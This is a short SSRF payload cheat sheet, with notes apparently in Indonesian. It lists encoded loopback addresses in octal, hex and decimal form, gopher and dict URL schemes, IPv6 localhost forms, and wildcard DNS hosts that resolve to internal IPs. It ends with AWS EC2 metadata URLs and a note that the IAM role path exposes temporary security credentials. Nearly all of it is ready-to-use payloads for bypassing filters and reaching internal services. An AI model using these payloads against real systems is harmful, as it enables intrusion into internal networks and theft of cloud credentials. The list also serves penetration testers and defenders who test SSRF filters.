## SSRF

```
http://0177.1/
```

```
http://0x7f.1/
```

```
https://520968996
```

_Catatan:_ Yang terakhir dapat dihitung menggunakan http://www.subnetmask.info/

**Exotic Handlers/Penangan Eksotis**

```
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```
http://[::1]
```

```
http://[::]
```

**Wildcard DNS/DNS karakter pengganti**

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```
_Tauta:_ http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

_Tauta:_ http://nip.io

**AWS EC2 Metadata**

```
http://169.254.169.254/latest/meta-data/  
```

```
http://169.254.169.254/latest/meta-data/local-hostname
```

```
http://169.254.169.254/latest/meta-data/public-hostname
```

> Jika ada IAM role yang terkait dengan instans tersebut, nama peran adalah nama peran tersebut, dan nama peran berisi kredensial keamanan sementara yang terkait dengan peran tersebut
[...]

[Tauta](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) (termasuk tabel Kategori Metadata Instance yang komprehensif)
